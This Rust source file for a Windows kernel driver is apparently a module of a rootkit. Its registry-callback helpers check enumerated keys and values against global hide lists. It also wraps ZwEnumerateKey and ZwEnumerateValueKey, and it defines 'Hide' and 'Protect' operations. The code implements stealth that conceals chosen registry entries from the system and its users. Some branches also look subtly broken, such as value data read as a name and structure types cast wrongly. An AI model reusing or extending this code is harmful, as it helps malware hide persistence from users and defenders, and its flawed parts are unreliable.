#![allow(non_upper_case_globals)]

use wdk_sys::*;
use wdk_sys::{
    ntddk::{ZwEnumerateKey, ZwEnumerateValueKey},
    _KEY_INFORMATION_CLASS::{KeyBasicInformation, KeyNameInformation},
    _KEY_VALUE_INFORMATION_CLASS::{
        KeyValueBasicInformation, KeyValueFullInformation, 
        KeyValueFullInformationAlign64,
    },
};
use core::{
    ffi::c_void, 
    mem::size_of, 
    slice::from_raw_parts
};

use super::{Registry, HIDE_KEYS, HIDE_KEY_VALUES};
use alloc::{format, string::String};

/// Checks if a specified registry key is present in the list of hidden keys.
///
/// This function checks if the provided registry key exists among the list of hidden keys, using
/// the information from the registry operation.
///
/// # Arguments
///
/// * `info` - Pointer to the operation information structure containing registry details.
/// * `key` - The name of the registry key to be checked.
///
/// # Returns
///
/// * Returns `true` if the key is found in the hidden keys list, otherwise returns `false`.
pub unsafe fn check_key(info: *mut REG_POST_OPERATION_INFORMATION, key: String) -> bool {
    log::debug!("check_key: Called with base key '{}'", key);
    let info_class = (*info).PreInformation as *mut REG_ENUMERATE_KEY_INFORMATION;
    let key_info_class = (*info_class).KeyInformationClass;
    log::debug!("check_key: KeyInformationClass = {}", key_info_class);

    match key_info_class {
        KeyBasicInformation => {
            let basic_information = (*info_class).KeyInformation as *mut KEY_BASIC_INFORMATION;
            let name_slice = from_raw_parts(
                (*basic_information).Name.as_ptr(),
                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
            );
            let full_key = format!("{}\\{}", key, String::from_utf16_lossy(name_slice));
            log::debug!("check_key: Constructed full key (BasicInformation): '{}'", full_key);
            if Registry::check_key(full_key.clone(), HIDE_KEYS.lock()) {
                log::info!("check_key: Registry::check_key returned true for '{}'", full_key);
                return true;
            } else {
                log::debug!("check_key: Registry::check_key returned false for '{}'", full_key);
            }
        }
        KeyNameInformation => {
            let name_info = (*info_class).KeyInformation as *mut KEY_NAME_INFORMATION;
            let name_slice = from_raw_parts(
                (*name_info).Name.as_ptr(),
                ((*name_info).NameLength / size_of::<u16>() as u32) as usize,
            );
            let full_key = format!("{}\\{}", key, String::from_utf16_lossy(name_slice));
            log::debug!("check_key: Constructed full key (NameInformation): '{}'", full_key);
            if Registry::check_key(full_key.clone(), HIDE_KEYS.lock()) {
                log::info!("check_key: Registry::check_key returned true for '{}'", full_key);
                return true;
            } else {
                log::debug!("check_key: Registry::check_key returned false for '{}'", full_key);
            }
        }
        1 => {
            let name_info = (*info_class).KeyInformation as *mut KEY_NODE_INFORMATION;
            let name_slice = from_raw_parts(
                (*name_info).Name.as_ptr(),
                ((*name_info).NameLength / size_of::<u16>() as u32) as usize,
            );
            let full_key = format!("{}\\{}", key, String::from_utf16_lossy(name_slice));
            log::debug!("check_key: Constructed full key (NodeInformation): '{}'", full_key);
            if Registry::check_key(full_key.clone(), HIDE_KEYS.lock()) {
                log::info!("check_key: Registry::check_key returned true for '{}'", full_key);
                return true;
            } else {
                log::debug!("check_key: Registry::check_key returned false for '{}'", full_key);
            }
        }
        other => {
            log::warn!("check_key: Unknown KeyInformationClass: {}", other);
            
        }
    }
    log::debug!("check_key: Returning false for base key '{}'", key);
    false
}

/// Checks if a specified registry key-value pair is present in the list of hidden key-values.
///
/// This function checks if the provided registry key-value pair exists among the list of hidden key-values,
/// using information from the registry value operation.
///
/// # Arguments
///
/// * `info` - Pointer to the operation information structure containing registry value details.
/// * `key` - The name of the registry key associated with the value to be checked.
///
/// # Returns
///
/// * Returns `true` if the key-value pair is found in the hidden key-values list, otherwise returns `false`.
pub unsafe fn check_key_value(info: *mut REG_POST_OPERATION_INFORMATION, key: String) -> bool {
    log::debug!("check_key_value: Called with base key '{}'", key);
    let info_class = (*info).PreInformation as *const REG_ENUMERATE_VALUE_KEY_INFORMATION;
    let kv_info_class = (*info_class).KeyValueInformationClass;
    log::debug!("check_key_value: KeyValueInformationClass = {}", kv_info_class);

    match kv_info_class {
        KeyValueBasicInformation => {
            let value_info = (*info_class).KeyValueInformation as *const KEY_VALUE_BASIC_INFORMATION;
            let name_slice = from_raw_parts(
                (*value_info).Name.as_ptr(),
                ((*value_info).NameLength / size_of::<u16>() as u32) as usize,
            );
            let value_name = String::from_utf16_lossy(name_slice);
            let full_key = format!("{}\\{}", key, value_name);
            log::debug!("check_key_value: Constructed full key (BasicInformation): '{}'", full_key);
            if Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
                log::info!("check_key_value: Registry::check_target returned true for '{}'", full_key);
                return true;
            } else {
                log::debug!("check_key_value: Registry::check_target returned false for '{}'", full_key);
            }
        }
        KeyValueFullInformationAlign64 | KeyValueFullInformation => {
            let value_info = (*info_class).KeyValueInformation as *const KEY_VALUE_FULL_INFORMATION;
            let name_slice = from_raw_parts(
                (*value_info).Name.as_ptr(),
                ((*value_info).NameLength / size_of::<u16>() as u32) as usize,
            );
            let value_name = String::from_utf16_lossy(name_slice);
            let full_key = format!("{}\\{}", key, value_name);
            log::debug!("check_key_value: Constructed full key (FullInformation): '{}'", full_key);
            if Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
                log::info!("check_key_value: Registry::check_target returned true for '{}'", full_key);
                return true;
            } else {
                log::debug!("check_key_value: Registry::check_target returned false for '{}'", full_key);
            }
        }
        2 => {
            let value_info = (*info_class).KeyValueInformation as *const KEY_VALUE_PARTIAL_INFORMATION;
            if value_info.is_null() {
                log::error!("check_key_value: KEY_VALUE_PARTIAL_INFORMATION pointer is null");
                return false;
            }
            // Cast the Data pointer (assumed to be an array of u8) to a pointer to u16.
            let data_ptr = (*value_info).Data.as_ptr() as *const u16;
            // Compute the number of characters.
            let num_chars = ((*value_info).DataLength as usize) / size_of::<u16>();
            let name_slice = from_raw_parts(data_ptr, num_chars);
            let value_name = String::from_utf16_lossy(name_slice);
            let full_key = format!("{}\\{}", key, value_name);
            log::debug!("check_key_value: Constructed full key (PartialInformation): '{}'", full_key);
            if Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
                log::info!("check_key_value: Registry::check_target returned true for '{}'", full_key);
                return true;
            } else {
                log::debug!("check_key_value: Registry::check_target returned false for '{}'", full_key);
            }
        }
        
        other => {
            log::warn!("check_key_value: Unknown KeyValueInformationClass: {}", other);
            
        }
    }
    log::debug!("check_key_value: Returning false for base key '{}'", key);
    false
}

/// Enumerates the specified registry key and retrieves its name.
///
/// This function enumerates the registry key based on the provided index and information class,
/// returning the key name in the desired format.
///
/// # Arguments
///
/// * `key_handle` - Handle of the target registry key.
/// * `index` - The index to be enumerated.
/// * `buffer` - Buffer that will store the registry key information.
/// * `buffer_size` - Size of the buffer.
/// * `key_information` - Type of information to retrieve about the target registry key.
/// * `result_length` - Pointer to store the size of the result.
///
/// # Returns
///
/// * Returns `Some(String)` containing the name of the registry key if successful,
///   otherwise returns `None`.
pub unsafe fn enumerate_key(
    key_handle: HANDLE,
    index: u32,
    buffer: *mut u8,
    buffer_size: u32,
    key_information: KEY_INFORMATION_CLASS,
    result_length: &mut u32,
) -> Option<String> {
    let status = ZwEnumerateKey(
        key_handle,
        index,
        key_information,
        buffer as *mut c_void,
        buffer_size,
        result_length,
    );

    if status == STATUS_NO_MORE_ENTRIES {
        log::debug!("enumerate_key: No more entries at index {}", index);
        return None;
    }

    if !NT_SUCCESS(status) {
        log::error!("enumerate_key: ZwEnumerateKey failed with status: {} at index {}", status, index);
        return None;
    }

    match key_information {
        KeyBasicInformation => {
            let basic_information = &*(buffer as *const KEY_BASIC_INFORMATION);
            let name_slice = from_raw_parts(
                (*basic_information).Name.as_ptr(),
                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
            );
            let key_name = String::from_utf16_lossy(name_slice);
            log::debug!("enumerate_key: Enumerated key (BasicInformation): '{}'", key_name);
            Some(key_name)
        }
        KeyNameInformation => {
            let name_information = &*(buffer as *const KEY_NAME_INFORMATION);
            let name_slice = from_raw_parts(
                (*name_information).Name.as_ptr(),
                ((*name_information).NameLength / size_of::<u16>() as u32) as usize,
            );
            let key_name = String::from_utf16_lossy(name_slice);
            log::debug!("enumerate_key: Enumerated key (NameInformation): '{}'", key_name);
            Some(key_name)
        }
        other => {
            log::warn!("enumerate_key: Unknown key_information class: {}", other);
            None
        }
    }
}

/// Enumerates the values of the specified registry key.
///
/// This function enumerates the values of the registry key based on the provided index and information class,
/// returning the value name in the desired format.
///
/// # Arguments
///
/// * `key_handle` - Handle of the target registry key.
/// * `index` - The index to be enumerated.
/// * `buffer` - Buffer that will store the registry key values.
/// * `buffer_size` - Size of the buffer.
/// * `key_value_information` - Type of information to retrieve about the registry key value.
/// * `result_length` - Pointer to store the size of the result.
///
/// # Returns
///
/// * Returns `Some(String)` containing the name of the registry key value if successful,
///   otherwise returns `None`.
pub unsafe fn enumerate_value_key(
    key_handle: HANDLE,
    index: u32,
    buffer: *mut u8,
    buffer_size: u32,
    key_value_information: KEY_VALUE_INFORMATION_CLASS,
    result_length: &mut u32,
) -> Option<String> {
    let status = ZwEnumerateValueKey(
        key_handle,
        index,
        key_value_information,
        buffer as *mut c_void,
        buffer_size,
        result_length,
    );

    if status == STATUS_NO_MORE_ENTRIES {
        log::debug!("enumerate_value_key: No more entries at index {}", index);
        return None;
    }

    if !NT_SUCCESS(status) {
        log::error!("enumerate_value_key: ZwEnumerateValueKey failed with status: {} at index {}", status, index);
        return None;
    }

    match key_value_information {
        KeyValueBasicInformation | KeyValueFullInformationAlign64 | KeyValueFullInformation => {
            let value_info = &*(buffer as *const KEY_VALUE_FULL_INFORMATION);
            let name_slice: &[u16] = from_raw_parts(
                value_info.Name.as_ptr(),
                (value_info.NameLength / size_of::<u16>() as u32) as usize,
            );
            let value_name = String::from_utf16_lossy(name_slice);
            log::debug!("enumerate_value_key: Enumerated value key: '{}'", value_name);
            Some(value_name)
        }
        other => {
            log::warn!("enumerate_value_key: Unknown key_value_information class: {}", other);
            None
        }
    }
}

/// Trait for accessing the object in registry information.
///
/// This trait defines a method to retrieve a pointer to the registry object from different registry information structures.
pub trait RegistryInfo {
    /// Retrieves a pointer to the registry object.
    ///
    /// # Returns
    ///
    /// * A raw pointer to the registry object.
    fn get_object(&self) -> *mut c_void;
}

impl RegistryInfo for REG_DELETE_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_DELETE_VALUE_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_SET_VALUE_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_QUERY_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_POST_OPERATION_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

/// Enum representing the types of operations to be done with the Registry.
pub enum Type {
    /// Hides the specified key or key-value.
    Hide,
    /// Protects the specified key or key-value from being modified.
    Protect,
}
